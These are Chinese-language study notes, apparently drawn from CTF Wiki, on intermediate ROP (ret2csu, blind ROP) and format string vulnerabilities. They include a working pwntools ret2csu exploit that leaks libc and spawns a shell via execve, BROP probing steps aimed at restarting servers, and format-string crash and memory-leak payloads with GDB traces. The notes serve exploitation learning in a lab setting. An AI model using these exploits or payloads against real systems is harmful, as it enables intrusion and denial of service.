# 1.中级ROP和格式化字符串漏洞    
鸣谢Vancir,CTF Wiki.    

## 中级ROP   
中级ROP和基础的区别就是gadgets的不同。    
### ret2csu   
64位系统中，很难直接找到每一个寄存器的gadgets，    
这时候，可以利用x64下的__libc_csu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。   
该函数：（不同版本有区别）   
 .text:00000000004005C0 ; void _libc_csu_init(void)   
 .text:00000000004005C0                 public _libc_csu_init   
 .text:00000000004005C0 _libc_csu_init proc near               ; DATA XREF: _start+16o   
 .text:00000000004005C0                 push    r15   
 .text:00000000004005C2                 push    r14   
 .text:00000000004005C4                 mov     r15d, edi   
 .text:00000000004005C7                 push    r13   
 .text:00000000004005C9                 push    r12   
 .text:00000000004005CB                 lea     r12, _frame_dummy_init_array_entry    
 .text:00000000004005D2                 push    rbp   
 .text:00000000004005D3                 lea     rbp, _do_global_dtors_aux_fini_array_entry    
 .text:00000000004005DA                 push    rbx   
 .text:00000000004005DB                 mov     r14, rsi    
 .text:00000000004005DE                 mov     r13, rdx    
 .text:00000000004005E1                 sub     rbp, r12      
 .text:00000000004005E4                 sub     rsp, 8    
 .text:00000000004005E8                 sar     rbp, 3    
 .text:00000000004005EC                 call    _init_proc    
 .text:00000000004005F1                 test    rbp, rbp    
 .text:00000000004005F4                 jz      short loc_400616    
 .text:00000000004005F6                 xor     ebx, ebx    
 .text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]   
 .text:0000000000400600   
 .text:0000000000400600 loc_400600:                             ; CODE XREF: _libc_csu_init+54j    
 .text:0000000000400600                 mov     rdx, r13    
 .text:0000000000400603                 mov     rsi, r14    
 .text:0000000000400606                 mov     edi, r15d   
 .text:0000000000400609                 call    qword ptr [r12+rbx*8]   
 .text:000000000040060D                 add     rbx, 1    
 .text:0000000000400611                 cmp     rbx, rbp    
 .text:0000000000400614                 jnz     short loc_400600    
 .text:0000000000400616   
 .text:0000000000400616 loc_400616:                             ; CODE XREF: _libc_csu_init+34j    
 .text:0000000000400616                 add     rsp, 8    
 .text:000000000040061A                 pop     rbx   
 .text:000000000040061B                 pop     rbp   
 .text:000000000040061C                 pop     r12   
 .text:000000000040061E                 pop     r13   
 .text:0000000000400620                 pop     r14   
 .text:0000000000400622                 pop     r15   
 .text:0000000000400624                 retn    
 .text:0000000000400624 _libc_csu_init endp   
![image](https://user-images.githubusercontent.com/96966904/148021608-f9cfda7a-3730-4aa5-885f-3e4a1a985dd1.png)   
  
安全保护状态：  
![image](https://user-images.githubusercontent.com/96966904/148022128-28d8d51a-22c0-484b-b728-43931a786f7b.png)  
64位系统，nx打开。  
程序如下，有一个栈溢出（老实说，我没看出来有栈溢出。。。）  
![image](https://user-images.githubusercontent.com/96966904/148022273-499add87-711b-433e-8955-4d6034dde40a.png)  
没有system函数地址，也没有/bin/sh字符串，方法同ret2libc,即调用system函数。  
若system函数无效，可使用execve获取shell。  
![image](https://user-images.githubusercontent.com/96966904/148022857-cc773dfb-452d-4720-9f3b-2f3739bc115f.png)  
exp：  
 from pwn import *  
 from LibcSearcher import LibcSearcher  
   
 #context.log_level = 'debug'  
    
 level5 = ELF('./level5')  
 sh = process('./level5')  
  
 write_got = level5.got['write']  
 read_got = level5.got['read']  
 main_addr = level5.symbols['main']  
 bss_base = level5.bss()  
 csu_front_addr = 0x0000000000400600  
 csu_end_addr = 0x000000000040061A  
 fakeebp = 'b' * 8   
  
  
 def csu(rbx, rbp, r12, r13, r14, r15, last):  
     # pop rbx,rbp,r12,r13,r14,r15  
     # rbx should be 0,  
     # rbp should be 1,enable not to jump  
     # r12 should be the function we want to call  
     # rdi=edi=r15d  
     # rsi=r14  
     # rdx=r13  
     payload = 'a' * 0x80 + fakeebp  
     payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(  
         r13) + p64(r14) + p64(r15)  
     payload += p64(csu_front_addr)  
     payload += 'a' * 0x38  
     payload += p64(last)  
     sh.send(payload)  
     sleep(1)  
  
  
 sh.recvuntil('Hello, World\n')   
 ##RDI, RSI, RDX, RCX, R8, R9, more on the stack  
 ##write(1,write_got,8)  
 csu(0, 1, write_got, 8, write_got, 1, main_addr)  
  
 write_addr = u64(sh.recv(8))  
 libc = LibcSearcher('write', write_addr)  
 libc_base = write_addr - libc.dump('write')  
 execve_addr = libc_base + libc.dump('execve')  
 log.success('execve_addr ' + hex(execve_addr))  
 ##gdb.attach(sh)  
  
 ##read(0,bss_base,16)  
 ##read execve_addr and /bin/sh\x00  
 sh.recvuntil('Hello, World\n')  
 csu(0, 1, read_got, 16, bss_base, 0, main_addr)  
 sh.send(p64(execve_addr) + '/bin/sh\x00')  
  
 sh.recvuntil('Hello, World\n')  
 ##execve(bss_base+8)  
 csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)  
 sh.interactive()  
  
上述exp是直接往gadgets注入128字节，但有的漏洞并不能注入那么多字节。  
因此提出改进方案：  
一是提前控制TBP和RBX马，二是多次利用、  
![image](https://user-images.githubusercontent.com/96966904/148024720-5571cccb-b5b0-41cc-82c4-9a8f4ad1e7bf.png)  
  
事实上，除了上述gadgets，gcc还会编译一些其他函数  
 _init  
 _start  
 call_gmon_start  
 deregister_tm_clones  
 register_tm_clones  
 _do_global_dtors_aux  
 frame_dummy  
 _libc_csu_init  
 _libc_csu_fini  
 _fini  
   
也可以执行其他的一些、  
此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。  
所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。  
![image](https://user-images.githubusercontent.com/96966904/148031583-9e763225-7442-49f2-b4d3-1be02f7f9081.png)  
但其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。  
其中，0x000000000040061A 是正常的起始地址，可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。  
要想熟练利用这些，需要掌握汇编指令的含义。  
gef➤  x/5i 0x000000000040061A  
   0x40061a <_libc_csu_init+90>:   pop    rbx  
   0x40061b <_libc_csu_init+91>:   pop    rbp  
   0x40061c <_libc_csu_init+92>:   pop    r12  
   0x40061e <_libc_csu_init+94>:   pop    r13  
   0x400620 <_libc_csu_init+96>:   pop    r14  
gef➤  x/5i 0x000000000040061b  
   0x40061b <_libc_csu_init+91>:   pop    rbp  
   0x40061c <_libc_csu_init+92>:   pop    r12  
   0x40061e <_libc_csu_init+94>:   pop    r13  
   0x400620 <_libc_csu_init+96>:   pop    r14  
   0x400622 <_libc_csu_init+98>:   pop    r15  
gef➤  x/5i 0x000000000040061A+3  
   0x40061d <_libc_csu_init+93>:   pop    rsp  
   0x40061e <_libc_csu_init+94>:   pop    r13  
   0x400620 <_libc_csu_init+96>:   pop    r14  
   0x400622 <_libc_csu_init+98>:   pop    r15  
   0x400624 <_libc_csu_init+100>:  ret  
gef➤  x/5i 0x000000000040061e  
   0x40061e <_libc_csu_init+94>:   pop    r13  
   0x400620 <_libc_csu_init+96>:   pop    r14  
   0x400622 <_libc_csu_init+98>:   pop    r15  
   0x400624 <_libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x000000000040061f  
   0x40061f <_libc_csu_init+95>:   pop    rbp  
   0x400620 <_libc_csu_init+96>:   pop    r14  
   0x400622 <_libc_csu_init+98>:   pop    r15  
   0x400624 <_libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x0000000000400620  
   0x400620 <_libc_csu_init+96>:   pop    r14  
   0x400622 <_libc_csu_init+98>:   pop    r15  
   0x400624 <_libc_csu_init+100>:  ret  
   0x400625:    nop  
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]  
gef➤  x/5i 0x0000000000400621  
   0x400621 <_libc_csu_init+97>:   pop    rsi  
   0x400622 <_libc_csu_init+98>:   pop    r15  
   0x400624 <_libc_csu_init+100>:  ret  
   0x400625:    nop  
gef➤  x/5i 0x000000000040061A+9  
   0x400623 <_libc_csu_init+99>:   pop    rdi  
   0x400624 <_libc_csu_init+100>:  ret  
   0x400625:    nop  
   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]  
   0x400630 <_libc_csu_fini>:  repz ret    
     
### ret2reg  
![image](https://user-images.githubusercontent.com/96966904/148166571-99ad2604-53a1-4c94-8e48-44222970a86f.png)  
  
### JOP  
  
### COP  
  
### BROP  
没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。  
攻击条件：  
 1.源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。  
 2.服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。  
目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。  
攻击原理：  
 默认开启BX,ASLR,Canary保护，通过BROP绕过这些保护进行攻击。  
 ![image](https://user-images.githubusercontent.com/96966904/148167024-12056990-dc4d-45a0-987a-091f82fd9c27.png)  
 栈溢出长度：  
  直接从1开始枚举，暴力破解。  
 stack reading：  
  经典栈布局：
  buffer|canary|saved fame pointer|saved returned address    
  要想得到 canary 以及之后的变量，我们需要解决第一个问题，如何得到 overflow 的长度，这个可以通过不断尝试来获取。  
  其次，关于 canary 以及后面的变量，所采用的的方法一致，这里以 canary 为例。  
  canary 本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的.  
  需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。  
  每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。  
  ![image](https://user-images.githubusercontent.com/96966904/148167564-f6020430-cd4e-4062-afa0-2d04a04a1957.png)  
 Blind ROP;  
  最简单是执行系统调用：  
   pop rdi; ret # socket  
   pop rsi; ret # buffer  
   pop rdx; ret # length  
   pop rax; ret # write syscall number  
   syscall  
  但是往往比较困难，不太可能找到syscall地址。一般转换为找write的方式来获取。  
  BROP gadgets：  
   libc_csu_init 的结尾一长串的 gadgets，可以通过偏移来获取 write 函数调用的前两个参数。  
   ![image](https://user-images.githubusercontent.com/96966904/148168110-ba31d51f-2cee-4737-81f5-7df1705ad259.png)  
  find a call write：  
   通过plt表获取write地址。  
  control rdx：  
   rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可。一般来说程序中的 rdx 经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。  
   但是，这句程序：pop rdx; ret  
   这样的指令几乎没有。又该如何控制 rdx 的数值呢？  
   执行 strcmp 的时候，rdx 会被设置为将要被比较的字符串的长度，所以我们可以找到 strcmp 函数，从而来控制 rdx。  
  综上，接下来的问题就是：  
   1.寻找gadgets  
   2.寻找plt表  
     write入口  
     strcmp入口  
    
  寻找gadgets：  
   由于不知道程序具体长什么样，只能通过简单的控制程序返回地址为自己设置的值，来猜测对应的gadgets。  
   当控制程序返回地址时，一般有以下几种情况：
    ![image](https://user-images.githubusercontent.com/96966904/148169293-22aa5ddc-148c-45d1-af72-9aefaa1f7206.png)   
   寻找合理的gadgets分为两步：  
    1.stop gadgets  
     所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。  
     但也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个 gadgets。  
     之所以要寻找 stop gadgets，是因为当我们猜到某个 gadgtes 后，如果我们仅仅是将其布置在栈上，由于执行完这个 gadget 之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会 crash。这样的话，在攻击者看来程序只是单纯的 crash 了。因此，攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。例子如下图：  
     ![image](https://user-images.githubusercontent.com/96966904/148169920-88505954-1280-48e3-8225-44fad4044a7e.png)  
     但是，如果我们布置了stop gadget，那么对于我们所要尝试的每一个地址，如果它是一个 gadget 的话，那么程序不会崩溃。接下来，就是去想办法识别这些 gadget。  
    2.识别gadgets：  
     可以通过栈布局以及程序的行为来进行识别。  
     ![image](https://user-images.githubusercontent.com/96966904/148170240-da1589b6-0f89-49e9-ae81-093c91c1166a.png)  
     可以通过在栈上摆放不同顺序的 Stop 与 Trap 从而来识别出正在执行的指令。因为执行 Stop 意味着程序不会崩溃，执行 Trap 意味着程序会立即崩溃。  
     ![image](https://user-images.githubusercontent.com/96966904/148170827-0bac2e64-eb46-49db-b951-ee8d4e2b6e44.png)  
     之所以要在每个布局的后面都放上 trap，是为了能够识别出，当我们的 probe 处对应的地址执行的指令跳过了 stop，程序立马崩溃的行为。  
     但是，即使是这样，我们仍然难以识别出正在执行的 gadget 到底是在对哪个寄存器进行操作。  
     但是，需要注意的是向 BROP 这样的一下子弹出 6 个寄存器的 gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets 就是 brop gadgets。  
     此外，这个 gadgets 通过错位还可以生成 pop rsp 等这样的 gadgets，可以使得程序崩溃也可以作为识别这个 gadgets 的标志。  
     此外，根据之前学的 ret2libc_csu_init 可以知道该地址减去 0x1a 就会得到其上一个 gadgets。可以供我们调用其它函数。  
  寻找PLT：  
   程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径。  
   即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。  
   ![image](https://user-images.githubusercontent.com/96966904/148171728-9c49b986-fe34-439f-8d68-8f77e295225d.png)  
   此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。  
   所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。  
   除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。  
   控制rdx：  
    当我们找到 plt 表之后，下面，我们就该想办法来控制 rdx 的数值了，那么该如何确认 strcmp 的位置呢？  
    需要提前说的是，并不是所有的程序都会调用 strcmp 函数，所以在没有调用 strcmp 函数的情况下，我们就得利用其它方式来控制 rdx 的值了。  
    这里给出程序中使用 strcmp 函数的情况。  
     之前已经找到了BROP的gadgets，已经可以控制函数的前两个参数了。  
     定义两种地址;  
      readable，可读的地址。  
      bad, 非法地址，不可访问，比如说 0x0。  
     如果控制传递的参数是上述两种地址的组合，会出现下面几种情况：  
      strcmp(bad,bad)  
      strcmp(bad,readable)  
      strcmp(readable,bad)  
      strcmp(readable,readable)  
     只有最后一种可以正常执行。  
     注：在没有 PIE 保护的时候，64 位程序的 ELF 文件的 0x400000 处有 7 个非零字节。   
     那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个却比较麻烦。  
     我们可以选择如下的一种方法：  
      利用 plt 表项的慢路径  
      并且利用下一个表项的慢路径的地址来覆盖返回地址  
     这样，我们就不用来回控制相应的变量了。  
     当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。  
       
  寻找输出函数：  
   寻找输出函数既可以寻找 write，也可以寻找 puts。  
   一般现先找 puts 函数。不过这里为了介绍方便，先介绍如何寻找 write。  
   寻找write@plt：
    当可以控制 write 函数的三个参数的时候，就可以再次遍历所有的 plt 表，根据 write 函数将会输出内容来找到对应的函数。  
    这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下有两种方法:  
     使用 rop chain，同时使得每个 rop 对应的文件描述符不一样  
     同时打开多个连接，并且我们使用相对较高的数值来试一试。  
    需要注意：  
     linux 默认情况下，一个进程最多只能打开 1024 个文件描述符。  
     posix 标准每次申请的文件描述符数值总是当前最小可用数值。  
   寻找puts@plt:  
    寻找 puts 函数 (这里我们寻找的是 plt)，我们自然需要控制 rdi 参数.  
    在上面，我们已经找到了 brop gadget。那么，我们根据 brop gadget 偏移 9 可以得到相应的 gadgets（由 ret2libc_csu_init 中后续可得）。  
    同时在程序还没有开启 PIE 保护的情况下，0x400000 处为 ELF 文件的头部，其内容为 \ x7fELF。所以我们可以根据这个来进行判断。  
    一般来说，其 payload 如下:  
     payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)  
       
 攻击总结:  
  此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出. text 段更多的内容以便于来找到更多合适 gadgets。  
  同时，攻击者还可以找到一些其它函数，如 dup2 或者 execve 函数。一般来说，攻击者此时会去做下事情:  
   将 socket 输出重定向到输入输出  
   寻找 “/bin/sh” 的地址。一般来说，最好是找到一块可写的内存，利用 write 函数将这个字符串写到相应的地址。  
   执行 execve 获取 shell，获取 execve 不一定在 plt 表中，此时攻击者就需要想办法执行系统调用了。  
    
 例子：  
  确定栈溢出长度：  
   ![image](https://user-images.githubusercontent.com/96966904/148174450-2174e775-91c7-466f-bc3d-9efa9d4d57d3.png)  
   可以确定栈溢出长度是72。  
   没有开启Canary保护，不需要Stack reading、  
  寻找stop gadgets：
   ![image](https://user-images.githubusercontent.com/96966904/148174688-6cc6587a-a54a-4939-b638-02dcd3c9153c.png)  
   直接尝试64位没有pie的情况，选择一个貌似返回到源程序中的地址：  
    one success stop gadget addr: 0x4006b6  
  识别BROP gadgets：  
   构造如下，get_brop_gadget 是为了得到可能的 brop gadget，后面的 check_brop_gadget 是为了检查。  
   ![image](https://user-images.githubusercontent.com/96966904/148175949-ddfacaeb-df19-4a5d-ae19-2720f2220389.png)  
   ![image](https://user-images.githubusercontent.com/96966904/148176016-d60d6a00-198e-4996-9a23-8b75c7b35c6c.png)  
   这样，我们基本得到了 brop 的 gadgets 地址 0x4007ba、  
  确定puts@plt：
   ![image](https://user-images.githubusercontent.com/96966904/148176137-f461c459-b1a9-4966-ba99-f153038ed5fb.png)  
   ![image](https://user-images.githubusercontent.com/96966904/148176179-d66bfe19-2901-4294-92e1-e84ece911ee0.png)  
   最后根据 plt 的结构，选择 0x400560 作为 puts@plt  
  泄露puts@got：
   在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。  
   我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。  
   ![image](https://user-images.githubusercontent.com/96966904/148176387-4d9e5881-859c-4728-9034-c5c1829eea98.png)  
   ![image](https://user-images.githubusercontent.com/96966904/148176437-e4fb83a7-f2a8-4fdf-8918-6703a4d0b8f5.png)  
   最后，我们将泄露的内容写到文件里。  
   需要注意的是如果泄露出来的是 “”, 那说明我们遇到了'\x00'，因为 puts 是输出字符串，字符串是以'\x00'为终止符的。  
   之后利用 ida 打开 binary 模式，首先在 edit->segments->rebase program 将程序的基地址改为 0x400000，然后找到偏移 0x560 处，如下：  
   ![image](https://user-images.githubusercontent.com/96966904/148176558-797915ac-759d-47c4-b0e2-297a026345be.png)  
   然后按下 c, 将此处的数据转换为汇编指令，如下   
   ![image](https://user-images.githubusercontent.com/96966904/148176607-21a1948b-bb61-4ee8-9a77-47d6da11d419.png)  
   这说明，puts@got 的地址为 0x601018。  
  程序利用：  
   ![image](https://user-images.githubusercontent.com/96966904/148176710-a5171f29-3e9c-485f-a77d-0eab072bd8dc.png)  
  
## 格式化字符串漏洞  
### 格式化字符串函数  
格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。  
通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。  
几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。  
一般来说，格式化字符串在利用的时候主要分为三个部分：  
 格式化字符串函数  
 格式化字符串  
 后续参数（可选）  
![image](https://user-images.githubusercontent.com/96966904/148338416-aa4264f0-6b3a-4287-a5cf-4056b7314fe2.png)  
格式化字符串函数：  
 常见的格式化字符串函数：  
  ![image](https://user-images.githubusercontent.com/96966904/148341902-dc244092-7bee-4fec-a23d-d90673c5bf76.png)  
格式化字符串：
 基本格式：  
  %[parameter][flags][field width][.precision][length]type  
  parameter：n$，获取格式化字符串中的指定参数  
  flag  
  field width：输出的最小宽度  
  precision：输出的最大长度  
  length，输出的长度（hh，输出一个字节；h，输出一个双字节）  
  type：  
   d/i，有符号整数  
   u，无符号整数  
   x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。  
   o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。  
   s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。  
   c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。  
   p， void * 型，输出对应变量的值。printf("%p",a) 用地址的格式打印变量 a 的值，printf("%p", &a) 打印变量 a 所在的地址。  
   n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。  
   %， '%'字面值，不接受任何 flags, width。  
参数：  
 就是相应的要输出的变量、  
### 格式化字符串漏洞原理  
格式化字符串函数是根据格式化字符串函数来进行解析的。  
那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。  
比如说'%s'表明我们会输出一个字符串参数。  
![image](https://user-images.githubusercontent.com/96966904/148342866-dad962a5-120d-4632-828f-f7b4085c2ac4.png)   
对于该例子，进入printf之前，栈上的内容从高地址到低地址如下：  
![image](https://user-images.githubusercontent.com/96966904/148343120-50f65f87-49ca-42d0-8627-4f809971fa2a.png)  
注：这里我们假设 3.14 上面的值为某个未知的值。  
在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况：  
 1.当前字符不是 %，直接输出到相应标准输出。  
 2.当前字符是 %， 继续读取下一个字符  
  如果没有字符，报错  
  如果下一个字符是 %, 输出 %  
  否则根据相应的字符，获取相应的参数，对其进行解析并输出  
此时我们的程序是：  
 printf("Color %s, Number %d, Float %4.2f");  
此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为：  
 解析其地址对应的字符串  
 解析其内容对应的整形值  
 解析其内容对应的浮点值  
对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。  
### 格式化字符串漏洞的利用  
格式化字符串漏洞的两个利用手段：  
 1.使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。  
 2.查看进程内容，根据 %d，%f 输出了栈上的内容。  
#### 程序崩溃  
通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可  
  %s%s%s%s%s%s%s%s%s%s%s%s%s%s  
这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。  
这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。  
比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。  
#### 泄露内存  
利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作：  
 泄露栈内存  
  获取某个变量的值  
  获取某个变量对应地址的内存  
 泄露任意地址内存  
  利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址  
  盲打，dump 整个程序，获取有用信息。  
    
泄露栈内存：  
 程序：  
 ![image](https://user-images.githubusercontent.com/96966904/148344477-a62bc6bf-d53d-4397-b66c-6ba3110c43cd.png)   
 编译：  
 ➜  leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c  
     leakmemory.c: In function ‘main’:  
     leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]  
        printf(s);  
               ^  
 可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。  
 下面，我们来看一下，如何获取对应的栈内存。  
 根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。  
 这里我们主要介绍 32 位。  
 获取栈变量数值：
  首先利用格式化字符串来获取栈上变量的数值。结果如下：  
  ![image](https://user-images.githubusercontent.com/96966904/148345804-6840e55d-81e0-4aa4-b566-64e9b92fecbe.png)  
  可以看到，我们确实得到了一些内容。  
  为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。  
  首先启动程序，断点下在printf  
   ![image](https://user-images.githubusercontent.com/96966904/148345985-b673a631-b016-4695-8d80-f25f85fdc93a.png)  
  之后运行  
   gef➤  r  
   Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory  
   %08x.%08x.%08x  
  此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，使程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置  
  ![image](https://user-images.githubusercontent.com/96966904/148346259-b908c57b-a828-43e1-94ac-b2044ef9631a.png)  
  可以看出，此时此时已经进入了 printf 函数中、   
  栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。  
  继续运行程序  
  ![image](https://user-images.githubusercontent.com/96966904/148346418-5132dca3-4348-41ab-8ddb-7dec906e72ce.png)  
  可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处  
  ![image](https://user-images.githubusercontent.com/96966904/148346643-78ca1964-c00f-43d5-bb94-d2cad888562e.png)  
  此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。  
  继续运行，我们可以得到如下结果去，确实和想象中的一样。  
  ![image](https://user-images.githubusercontent.com/96966904/148347733-2a0a8b2c-7dcd-4a9a-bc14-a55f7a0118f9.png)  
  当然，也可以使用%p  
  ![image](https://user-images.githubusercontent.com/96966904/148347870-1a81972d-d957-4647-add3-db3897002bfb.png)  
  这里需要注意的是，并不是每次得到的结果都一样，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。  
  我们上面给出的方法，都是依次获得栈中的每个参数，  
  直接获取栈中被视为第 n+1 个参数的值的方法如下：  
   %n$x  
  利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。  
  为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数。  
  这里我们再次以 gdb 调试一下。  
   ➜  leakmemory git:(master) ✗ gdb leakmemory  
   gef➤  b printf  
   Breakpoint 1 at 0x8048330  
   gef➤  r  
   Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory  
   %3$x  
     
   Breakpoint 1, _printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28  
   28  printf.c: 没有那个文件或目录.  
     
   ─────────────────────────────────────────────────[ code:i386 ]────  
      0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]  
      0xf7e4466d                  nop  
      0xf7e4466e                  xchg   ax, ax  
    → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <_x86.get_pc_thunk.ax>  
      ↳  0xf7f1ab09 <_x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]  
         0xf7f1ab0c <_x86.get_pc_thunk.ax+3> ret  
          0xf7f1ab0d <_x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]  
          0xf7f1ab10 <_x86.get_pc_thunk.dx+3> ret  
   ─────────────────────────────────────────────────────[ stack ]────  
   ['0xffffccec', 'l8']  
   8  
   0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp  
   0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s"  
   0xffffccf4│+0x08: 0x00000001  
   0xffffccf8│+0x0c: 0x22222222  
   0xffffccfc│+0x10: 0xffffffff  
   0xffffcd00│+0x14: 0xffffcd10  →  "%3$x"  
   0xffffcd04│+0x18: 0xffffcd10  →  "%3$x"  
   0xffffcd08│+0x1c: 0x000000c2  
   gef➤  c  
   Continuing.  
   00000001.22222222.ffffffff.%3$x  
     
   Breakpoint 1, _printf (format=0xffffcd10 "%3$x") at printf.c:28  
   28  in printf.c  
   ─────────────────────────────────────────────────────[ code:i386 ]────  
      0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   
      0xf7e4466d                  nop  
      0xf7e4466e                  xchg   ax, ax  
    → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <_x86.get_pc_thunk.ax>  
      ↳  0xf7f1ab09 <_x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]  
         0xf7f1ab0c <_x86.get_pc_thunk.ax+3> ret  
         0xf7f1ab0d <_x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]  
         0xf7f1ab10 <_x86.get_pc_thunk.dx+3> ret  
   ─────────────────────────────────────────────────────[ stack ]────  
   ['0xffffccfc', 'l8']  
   8  
   0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp  
   0xffffcd00│+0x04: 0xffffcd10  →  "%3$x"  
